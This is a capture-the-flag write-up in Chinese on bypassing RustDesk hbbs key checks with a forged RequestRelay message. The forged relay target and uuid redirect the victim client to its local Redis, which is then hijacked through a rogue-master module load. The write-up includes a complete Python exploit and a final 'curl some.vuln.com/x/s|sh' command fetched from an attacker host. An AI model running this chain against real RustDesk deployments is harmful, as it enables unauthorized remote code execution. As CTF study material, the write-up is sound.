# Rustdesk笑传之change client backend

## 题目简述

题目为一台安装有 Redis 和 RustDesk 受控端客户端的 Linux 服务器。题面要求在不能正常拿到 RustDesk 服务器公钥、且受控端被配置为 view-only 的情况下执行 `/readflag`。

附件中的 Flask 小服务暴露了三个辅助接口：`/api/rustdesk/id` 读取并缓存本机 RustDesk ID，`/api/redis/info` 返回 Redis `Server` 信息，`/api/redis/ping` 测试本机 Redis。题目给出了靶机服务器的 RustDesk 客户端 ID，并且给出了靶机服务器使用的 Redis 版本（5.0.7）。

附件 readme 说明受控端使用 RustDesk 1.4.1，服务器使用 `rustdesk/rustdesk-server:1.1.14`，主控端和受控端使用同一个客户端安装包。`RustDesk2.toml` 中还关闭了键盘、文件传输、剪贴板、终端、LAN 发现等能力，并设置 `approve-mode = 'click'`，所以即使能正常连接，传统远控操作也不是主要路径。

尝试本地安装Rustdesk客户端连接目标服务器ID可以发现，主控端任何连接都需要服务器Key才能开始，而题目不给出服务器Key。

Rustdesk开源版本服务器分为两个部分，hbbs（rendezvous_server，集合服务器）负责ID管理，hbbr（relay_server，中继服务器）负责中继通信。

本题的核心不是直接爆破 Rustdesk Key，而是利用 hbbs 对不同 rendezvous 消息的校验不一致：`PunchHoleRequest` 会校验 Key，但 `RequestRelay` 可被直接转发给指定 peer。攻击者可以伪造 `RequestRelay`，让受控端主动连接攻击者指定的 relay server；如果 relay server 写成 `127.0.0.1:6379`，受控端本机的 Redis 会收到由 protobuf 字段拼出来的明文内容，从而可借 Redis 协议注入命令。

## 解题过程

### Rustdesk 协议关键点

审计 hbbr 源码可以发现，默认情况下它并不验证 Key。`relay_server.rs` 中只有 `key` 非空时才校验，`hbbr.rs` 会从命令行参数或环境变量 `KEY` 读取 key；若未配置，解码后的 key 是空值，因此 hbbr 不做 Key 校验。本题最终不需要利用 hbbr，但这个结论说明 Rustdesk 开源服务端的 Key 校验分散在不同组件和消息路径里。

审计 hbbs 源码发现，`handle_punch_hole_request` 函数中实现了对 Key 的验证，但是其他消息处理路径没有同等校验。

在 `handle_tcp` 函数中可以看到 hbbs 会响应这些 `rendezvous_message` 消息：

```
rendezvous_message::Union::PunchHoleRequest
rendezvous_message::Union::RequestRelay
rendezvous_message::Union::RelayResponse
rendezvous_message::Union::PunchHoleSent
rendezvous_message::Union::LocalAddr
rendezvous_message::Union::TestNatRequest
rendezvous_message::Union::RegisterPk
```

其中只有响应 `PunchHoleRequest` 时验证 Key。

抓包分析或分析源码可得知，正常情况下，主控端连接受控端都要先向 hbbs 发送 `PunchHoleRequest`，然后根据 NAT 情况选择打洞、中继或直接内网连接。客户端侧逻辑会先发起连接协商，再决定是否走 relay。

如果主控客户端决定使用中继，会向 hbbs 发送 `RequestRelay` 消息；hbbs 将该消息转发给 peer，然后主控客户端和受控客户端同时向 hbbr 服务器使用同一个 uuid 连接。

这就带来了两个问题：

1. 主控客户端和受控客户端连接的hbbr服务器是哪一个？
2. uuid是在哪决定的？

继续分析 `RequestRelay` 消息。hbbs 响应 `RequestRelay` 时，会根据传入的 peer id 在内存中寻找 Peer；如果 Peer 存在，就把 `RequestRelay` 原封不动转发给 peer。这意味着 `relay_server` 和 `uuid` 字段都可以由发起者控制，并被受控端信任。

接着看客户端收到RequestRelay消息会如何处理：

客户端收到 `RequestRelay` 后，会读取消息里的 `relay_server`，主动打开一个 TCP 连接，然后再向该连接发送一个 `RequestRelay` 消息。该回连消息包含本地客户端填写的 `licence_key` 和收到的 `uuid`。因此，攻击者控制 `relay_server` 就等价于控制受控端下一跳 TCP 目标；控制 `uuid` 则可以影响受控端发送到该 TCP 目标的数据内容。

因此，可以回答之前提出的两个问题：

1. 主控客户端和受控客户端连接的hbbr服务器是由主控客户端提出的，通过RequestRelay消息发送给受控客户端。
2. uuid是由主控客户端决定的，通过RequestRelay消息发送给受控客户端。

综上，这就带来了三个问题：

1. 主控客户端如果直接发送 `RequestRelay` 消息而不发送 `PunchHoleRequest`，就绕过了 hbbs 的 Key 检测。
2. 主控客户端可以任意指定 hbbr 地址，如果 hbbr 地址指向受控端本机的无密码 Redis，就能让受控端连接自己的 `127.0.0.1:6379`。
3. 主控客户端可以任意指定 uuid，protobuf 字符串字段会以明文形式进入 TCP 数据；如果 uuid 包含 CRLF 和 Redis 命令，就能形成 Redis 协议注入。
4. 因为受控端发送的RequestRelay消息里包含有licence_key（即受控端本地填写的服务器Key），如果受控端本地填写了服务器Key，可以泄露受控端填写的服务器Key到任意tcp端点。（本题中，受控端没有填写服务器Key，因此无法利用这一点）

因此，编写Python脚本直接发送RequestRelay消息到hbbs，指定靶机的ID，指定relay_server地址为127.0.0.1:6379，指定uuid为redis命令，即可绕过服务器Key，并在本地无密码的redis服务器执行命令。

靶机的redis服务器版本为5.0.7，可以使用主从同步写入恶意模块并执行任意系统命令。

### 构造消息与 Redis 利用

`RequestRelay` 消息本身是 protobuf 消息，定义中的关键字段为 `id`、`uuid`、`relay_server`、`secure`、`licence_key`、`conn_type` 和 `token`。使用 `protoc rendezvous.proto --python_out=./python` 生成 Python 绑定后，就可以构造 `RendezvousMessage.request_relay` 并发送到 hbbs。

hbbs有tcp和websocket端点，通过websocket发送较tcp更简单。

exp 中的 `some.vuln.com 6379` 是运行 Redis rogue server 的攻击机地址。Redis rogue server 的作用是伪装成 Redis 主库，让目标 Redis 执行 `SLAVEOF` 后从攻击机同步一个恶意 RDB；该 RDB 实际包含 Redis 模块，目标加载模块后即可执行 `system.exec`。这里需要把工具默认端口改为本题要让目标连接的端口，`curl some.vuln.com/x/s|sh` 则是最终由 Redis 模块执行的命令。

```python
import time
from websockets.sync.client import connect
import google.protobuf

import rendezvous_pb2 as rendezvous_message

SERVER= "ws://<hbbs>:21118/"
REMOTE_ID = "<remote-id>"
KEY=None

def send_redis_command(command):

    RendezvousMessage = rendezvous_message.RendezvousMessage

    '''
    message RequestRelay {
    string id = 1;
    string uuid = 2;
    bytes socket_addr = 3;
    string relay_server = 4;
    bool secure = 5;
    string licence_key = 6;
    ConnType conn_type = 7;
    string token = 8;
    }
    '''
    message = rendezvous_message.RendezvousMessage()
    r = rendezvous_message.RequestRelay()


    r.id = REMOTE_ID
    r.uuid = '\r\n'+command+'\r\n'
    r.relay_server = "127.0.0.1:6379"
    r.secure = False
    if KEY:
        r.licence_key=KEY

    message.request_relay.CopyFrom(r)


    print("===== The message to send =====")
    print(message)
    print("================================")
    toString = message.SerializeToString()





    def hello():
        with connect(SERVER) as websocket:
            websocket.send(toString)
            raw_data = websocket.recv()
            message = RendezvousMessage()
            message.ParseFromString(raw_data)
            print("===== The received message =====")
            print(message)
            print("================================")

    hello()


send_redis_command("slaveof some.vuln.com 6379")

time.sleep(5)

#Add spaces to prevent "'" from appearing in the protobuf binary
send_redis_command("module load /var/lib/redis/dump.rdb          ")
time.sleep(1)
send_redis_command('system.exec "curl some.vuln.com/x/s|sh"')
```

## 方法总结

- 核心技巧：绕过 Rustdesk hbbs 对 `PunchHoleRequest` 的 Key 校验，直接伪造 `RequestRelay`，利用可控 `relay_server` 和 `uuid` 让受控端本机 Redis 执行协议注入，再通过 Redis 主从同步加载恶意模块执行命令。
- 识别信号：远控/中继类协议如果把“选择中继服务器”和“连接令牌/uuid”交给客户端控制，应检查这些字段是否会被 peer 原样信任，并检查是否能指向 `127.0.0.1` 等本地服务。
- 复用要点：外链源码的关键结论已经内化为三点：hbbs 只在 `PunchHoleRequest` 路径校验 Key，`RequestRelay` 会原样转发，受控端会主动连接消息里的 `relay_server` 并发送包含 uuid 的明文 protobuf 数据。利用 Redis 时要保证 CRLF 命令能进入 TCP 流，并准备可被 Redis 5.0.7 加载的恶意模块。
